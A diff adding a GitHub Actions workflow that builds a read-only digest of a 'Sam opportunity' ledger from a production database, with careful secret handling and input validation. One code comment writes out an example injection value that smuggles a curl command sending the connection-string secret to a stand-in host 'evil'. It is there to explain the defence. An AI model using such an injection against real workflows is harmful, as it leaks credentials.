@@ -1,0 +1,159 @@
+name: Sam Opportunity Digest
+
+# The production reviewer path for the Sam opportunity ledger.
+#
+# What this produces is content-free by construction: counts, closed-vocabulary codes, review
+# statuses, timestamps, distinct-learner counts, and content-free fingerprints. It cannot carry
+# learner text, owner ids, conversation ids, message ids, tool arguments, emails, or decrypted
+# evidence — the projection is guarded by CoachOpportunityDigestTests, which asserts against the
+# SQL the provider emits rather than against a comment.
+#
+# PREREQUISITES (this job is honest about being unable to run without them):
+#   1. A repository secret named COACH_DIGEST_CONNECTION_STRING holding a read-capable PostgreSQL
+#      connection string for the production database. The tool forces
+#      `default_transaction_read_only=on` server-side regardless.
+#   2. Network reachability from a GitHub-hosted runner to the PostgreSQL Flexible Server. The
+#      production server (db-rsn72awybem6s) is firewalled; runner IPs are dynamic, so this needs
+#      either a firewall rule or a self-hosted runner.
+#
+# When the secret is absent the job SKIPS with a notice and does not fail. It never fabricates a
+# digest, and it never uploads an artifact it did not read from the database. Run
+# `./scripts/sam-opportunity-digest.sh` locally instead — see docs/sam-opportunity-digest.md.
+
+on:
+  workflow_dispatch:
+    inputs:
+      days:
+        description: 'Window in days (0 = everything still retained)'
+        required: false
+        default: '7'
+  schedule:
+    # Mondays 13:00 UTC — before the weekly review slot named in docs/sam-future-opportunities.md.
+    - cron: '0 13 * * 1'
+
+permissions:
+  contents: read
+
+jobs:
+  digest:
+    name: Sam opportunity digest
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      - name: Check prerequisites
+        id: prereq
+        env:
+          # Referenced, never printed. The step tests only whether it is non-empty.
+          DIGEST_CONNECTION_CONFIGURED: ${{ secrets.COACH_DIGEST_CONNECTION_STRING != '' }}
+        run: |
+          if [ "$DIGEST_CONNECTION_CONFIGURED" = "true" ]; then
+            echo "configured=true" >> "$GITHUB_OUTPUT"
+          else
+            echo "configured=false" >> "$GITHUB_OUTPUT"
+            {
+              echo "## Sam opportunity digest — skipped"
+              echo
+              echo "The repository secret \`COACH_DIGEST_CONNECTION_STRING\` is not set, so there is"
+              echo "no database to read and this job did not produce a digest."
+              echo
+              echo "Run the reviewer path locally instead:"
+              echo
+              echo '```bash'
+              echo './scripts/sam-opportunity-digest.sh --days 7'
+              echo '```'
+              echo
+              echo "Prerequisites and the weekly process: \`docs/sam-opportunity-digest.md\`."
+            } >> "$GITHUB_STEP_SUMMARY"
+          fi
+
+      - name: Setup .NET
+        if: steps.prereq.outputs.configured == 'true'
+        uses: actions/setup-dotnet@v4
+        with:
+          dotnet-version: '10.0.x'
+
+      - name: Disable dev-only local NuGet source
+        if: steps.prereq.outputs.configured == 'true'
+        run: dotnet nuget disable source localnugets --configfile src/NuGet.config || true
+
+      - name: Build the digest tool
+        if: steps.prereq.outputs.configured == 'true'
+        run: dotnet build tools/SamOpportunityDigest/SamOpportunityDigest.csproj --configuration Release
+
+      - name: Validate the requested window
+        id: window
+        if: steps.prereq.outputs.configured == 'true'
+        env:
+          # The ONLY place the dispatch input is interpolated, and it is interpolated into `env`,
+          # never into `run:`. Expressions in a `run:` block are substituted into the script TEXT
+          # before bash ever parses it, so `7"; curl evil/?k=$COACH_DIGEST_CONNECTION_STRING; #`
+          # would become script rather than an argument. As an environment variable the same string
+          # is inert data: bash assigns it and never re-parses it.
+          #
+          # This step deliberately holds no secret, so the shell that first sees learner-dispatched
+          # text has nothing worth stealing even if something here were wrong.
+          DIGEST_DAYS: ${{ github.event.inputs.days || '7' }}
+        run: |
+          set -euo pipefail
+
+          # The value is never echoed. Printing untrusted input into the log is its own injection
+          # surface — the runner reads `::` workflow commands back out of a job's own output.
+          if [ -z "$DIGEST_DAYS" ]; then
+            echo "::error::The digest window is empty. Pass a whole number of days (0 = everything still retained)."
+            exit 1
+          fi
+
+          case "$DIGEST_DAYS" in
+            *[!0-9]*)
+              echo "::error::The digest window must be digits only, with no sign, spaces, or punctuation."
+              exit 1
+              ;;
+          esac
+
+          # Digits-only already forbids a negative window. Length is checked before the numeric
+          # comparison because `[ -gt ]` compares as a machine integer: a digit string longer than
+          # int64 is out of range before the shell can say it is out of policy, and what a shell
+          # does with an out-of-range operand is not something the ceiling should depend on. Four
+          # digits is the whole of the allowed range, so anything longer is already refused.
+          if [ "${#DIGEST_DAYS}" -gt 4 ]; then
+            echo "::error::The digest window must be between 0 and 3650 days."
+            exit 1
+          fi
+
+          # The ceiling keeps a typo from asking the database for a scan no retention policy could
+          # satisfy.
+          if [ "$DIGEST_DAYS" -gt 3650 ]; then
+            echo "::error::The digest window must be between 0 and 3650 days."
+            exit 1
+          fi
+
+          echo "days=$DIGEST_DAYS" >> "$GITHUB_OUTPUT"
+
+      - name: Read the digest
+        if: steps.prereq.outputs.configured == 'true'
+        env:
+          COACH_DIGEST_CONNECTION_STRING: ${{ secrets.COACH_DIGEST_CONNECTION_STRING }}
+          # Proved to be digits by the step above, so this expression cannot carry shell syntax.
+          # It is still passed as data and still quoted below: the guarantee is the validation, and
+          # the quoting is what keeps that guarantee from depending on the validation staying right.
+          DIGEST_DAYS: ${{ steps.window.outputs.days }}
+        run: |
+          dotnet run --project tools/SamOpportunityDigest/SamOpportunityDigest.csproj \
+            --configuration Release --no-build -- \
+            --days "$DIGEST_DAYS" \
+            --output sam-opportunity-digest.md
+
+      - name: Publish the digest to the job summary
+        if: steps.prereq.outputs.configured == 'true'
+        run: cat sam-opportunity-digest.md >> "$GITHUB_STEP_SUMMARY"
+
+      - name: Upload the digest
+        if: steps.prereq.outputs.configured == 'true'
+        uses: actions/upload-artifact@v4
+        with:
+          name: sam-opportunity-digest
+          path: sam-opportunity-digest.md
+          retention-days: 30
